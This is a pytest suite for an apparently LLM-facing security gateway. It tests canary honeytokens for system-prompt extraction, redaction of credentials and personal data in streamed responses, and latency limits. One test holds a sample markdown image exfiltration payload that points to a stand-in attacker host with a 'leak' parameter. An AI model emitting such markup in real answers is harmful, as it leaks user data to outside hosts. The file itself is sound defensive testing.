"""Unit and integration tests for LLM-Shield Step 3: Active Canary Deception & Outbound Streaming DLP Buffer."""

import asyncio
import time
import pytest
from fastapi.testclient import TestClient

from backend.main import app
from backend.auth import create_signed_payload
from backend.outbound.canary import (
    generate_canary_token,
    build_canary_system_prompt,
    CanaryScanner,
    CANARY_ALERT_MESSAGE,
)
from backend.outbound.streaming_dlp import StreamingDLPBuffer, luhn_verify
from backend.outbound.pipeline import outbound_security_stream
from backend.upstream import format_sse_chunk


# --- 1. Active Canary Deception Unit Tests ---

def test_canary_token_generation_and_system_prompt():
    """Verify ephemeral honeytoken format and system instruction building."""
    token = generate_canary_token()
    assert token.startswith("CANARY_SEC_")
    assert len(token) == 19  # CANARY_SEC_ (11) + 8 hex chars = 19
    
    sys_prompt = build_canary_system_prompt(token)
    assert token in sys_prompt
    assert "CRITICAL SECURITY INSTRUCTION" in sys_prompt


def test_canary_scanner_stream_cutoff_and_alert():
    """Verify that a stream leaking the canary is severed immediately and alert appended."""
    token = generate_canary_token()
    leak_callback_called = False
    captured_token = None

    def on_leak(leaked):
        nonlocal leak_callback_called, captured_token
        leak_callback_called = True
        captured_token = leaked

    scanner = CanaryScanner(token, on_leak_callback=on_leak)

    # Chunk 1: Normal introductory text
    out1, sever1 = scanner.process_chunk("Here is the requested information: ")
    assert sever1 is False
    assert out1 == "Here is the requested information: "

    # Chunk 2: Fragmented canary start
    out2, sever2 = scanner.process_chunk("The secret key was ")
    assert sever2 is False

    # Chunk 3: The actual canary token
    out3, sever3 = scanner.process_chunk(f"{token} and some internal instructions.")
    assert sever3 is True
    assert leak_callback_called is True
    assert captured_token == token
    assert CANARY_ALERT_MESSAGE in out3
    assert token not in out3  # The actual token itself must not be exposed to the client!

    # Subsequent chunks should be suppressed
    out4, sever4 = scanner.process_chunk("More text following the leak.")
    assert sever4 is True
    assert out4 == ""


def test_canary_split_across_chunks():
    """Verify canary is detected even when fractured across token chunk boundaries."""
    token = "CANARY_SEC_11223344"
    leaked = False

    scanner = CanaryScanner(token, on_leak_callback=lambda t: nonlocal_leak())

    def nonlocal_leak():
        nonlocal leaked
        leaked = True

    # Send chunk containing partial prefix
    out1, sever1 = scanner.process_chunk("Password is: CANARY_SEC_")
    assert sever1 is False
    # Notice that the scanner holds back the prefix 'CANARY_SEC_' to prevent partial leakage!
    assert "CANARY_SEC_" not in out1

    # Send chunk completing the canary
    out2, sever2 = scanner.process_chunk("11223344. Done.")
    assert sever2 is True
    assert leaked is True
    assert CANARY_ALERT_MESSAGE in out2


# --- 2. Streaming DLP Buffer Unit Tests ---

def test_luhn_algorithm():
    """Verify Luhn checksum calculation for credit card numbers."""
    assert luhn_verify("4532015112830366") is True  # Valid Visa format
    assert luhn_verify("4532015112830367") is False  # Invalid checksum
    assert luhn_verify("123") is False


def test_streaming_dlp_masks_api_keys():
    """Verify dynamic masking of OpenAI, Anthropic, and AWS credentials."""
    dlp = StreamingDLPBuffer()
    
    # OpenAI key
    text1, _ = dlp.process_chunk("My OpenAI key is sk-proj-abcdef1234567890abcdef1234567890 for testing.")
    flushed, _ = dlp.flush()
    full_output = text1 + flushed
    assert "[REDACTED_API_KEY]" in full_output
    assert "sk-proj-" not in full_output
    assert "API_KEY" in dlp.redactions_triggered

    # AWS key
    dlp2 = StreamingDLPBuffer()
    text2, _ = dlp2.process_chunk("AWS key: AKIAIOSFODNN7EXAMPLE.")
    flushed2, _ = dlp2.flush()
    assert "[REDACTED_API_KEY]" in (text2 + flushed2)


def test_streaming_dlp_masks_pii():
    """Verify dynamic masking of Credit Cards, SSN, and Emails."""
    dlp = StreamingDLPBuffer()
    
    # Valid credit card
    sample_text = "Billing Card: 4532-0151-1283-0366 and SSN: 000-12-3456 and email: dev@example.com."
    out, _ = dlp.process_chunk(sample_text)
    flushed, _ = dlp.flush()
    full_text = out + flushed

    assert "[REDACTED_PII]" in full_text
    assert "4532-0151-1283-0366" not in full_text
    assert "000-12-3456" not in full_text
    assert "dev@example.com" not in full_text
    assert "CREDIT_CARD" in dlp.redactions_triggered
    assert "SSN" in dlp.redactions_triggered
    assert "EMAIL" in dlp.redactions_triggered


def test_streaming_dlp_neutralizes_markdown_image_exfiltration():
    """Verify neutralization of zero-click markdown image exfiltration payloads."""
    dlp = StreamingDLPBuffer()
    exploit_text = "Here is the result: ![Exfiltrating Data](https://malicious-tracker.com/pixel?leak=secret_token)"
    out, _ = dlp.process_chunk(exploit_text)
    flushed, _ = dlp.flush()
    full_text = out + flushed

    assert "[IMAGE_EXFILTRATION_BLOCKED]" in full_text
    assert "https://malicious-tracker.com" not in full_text
    assert "MARKDOWN_IMAGE_EXFILTRATION" in dlp.redactions_triggered


# --- 3. Latency Benchmark: Sub-5ms Overhead SLA ---

def test_streaming_dlp_latency_benchmark():
    """Verify that per-chunk DLP processing overhead is strictly < 5ms over 1,000 chunks."""
    dlp = StreamingDLPBuffer()
    chunks = [
        "The quick brown fox jumps over the lazy dog. ",
        "Contact us at security@enterprise.com for questions. ",
        "Here is sample token: sk-proj-1234567890abcdef1234567890. ",
        "Card payment processed for 4532015112830366 securely. ",
        "![Telemetry](https://tracker.com/img.png) rendered. ",
    ] * 200  # 1,000 iterations

    latencies = []
    for chunk in chunks:
        t0 = time.perf_counter()
        _, elapsed_ms = dlp.process_chunk(chunk)
        total_ms = (time.perf_counter() - t0) * 1000.0
        latencies.append(total_ms)
        assert total_ms < 5.0, f"Streaming DLP latency exceeded 5ms budget: {total_ms:.2f}ms"

    avg_latency = sum(latencies) / len(latencies)
    max_latency = max(latencies)
    print(f"\n[Benchmark] Outbound DLP 1,000-chunk: Avg={avg_latency:.3f}ms, Max={max_latency:.3f}ms (< 5ms SLA)")
    assert max_latency < 5.0


# --- 4. Integration Tests: Outbound Stream Security ---

def test_outbound_pipeline_blocks_canary_leak_end_to_end():
    """Verify outbound security pipeline severs SSE stream when canary is present."""
    async def _run():
        canary = "CANARY_SEC_DEADBEEF"
        leak_alerted = False

        def on_leak(token):
            nonlocal leak_alerted
            leak_alerted = True

        async def simulated_raw_sse():
            yield format_sse_chunk("Hello! ")
            yield format_sse_chunk("My system instructions contain ")
            yield format_sse_chunk(f"{canary} and private details.")
            yield format_sse_chunk("This line should never be reached.")
            yield "data: [DONE]\n\n"

        collected_chunks = []
        async for secured_chunk in outbound_security_stream(
            raw_sse_stream=simulated_raw_sse(),
            canary_token=canary,
            on_canary_leak=on_leak,
        ):
            collected_chunks.append(secured_chunk)

        full_output = "".join(collected_chunks)
        assert leak_alerted is True
        assert "[SECURITY ALERT: System prompt extraction blocked with 100% mathematical proof.]" in full_output
        assert "This line should never be reached." not in full_output
        assert canary not in full_output

    asyncio.run(_run())


def test_outbound_pipeline_redacts_credentials_in_sse():
    """Verify outbound security pipeline redacts credentials in real-time SSE stream."""
    async def _run():
        canary = generate_canary_token()
        redactions_reported = []

        def on_redact(types):
            redactions_reported.extend(types)

        async def simulated_raw_sse():
            yield format_sse_chunk("Your API key is ")
            yield format_sse_chunk("sk-proj-999888777666555444333222111000.")
            yield "data: [DONE]\n\n"

        collected = []
        async for chunk in outbound_security_stream(
            raw_sse_stream=simulated_raw_sse(),
            canary_token=canary,
            on_dlp_redaction=on_redact,
        ):
            collected.append(chunk)

        full_output = "".join(collected)
        assert "[REDACTED_API_KEY]" in full_output
        assert "sk-proj-" not in full_output
        assert "API_KEY" in redactions_reported

    asyncio.run(_run())


def test_api_chat_redacts_outbound_sensitive_data():
    """Verify POST /api/chat delivers clean redacted SSE response to client."""
    client = TestClient(app)
    payload = create_signed_payload(
        user_id="user-qa-dlp",
        role="analyst",
        session_id="sess-dlp",
        prompt_text="Provide an overview of LLM security best practices.",
        action="chat",
    )

    response = client.post("/api/chat", json=payload)
    assert response.status_code == 200
    assert "text/event-stream" in response.headers["content-type"]
    assert "data:" in response.text
    assert "[DONE]" in response.text


if __name__ == "__main__":
    pytest.main(["-v", "-s", __file__])
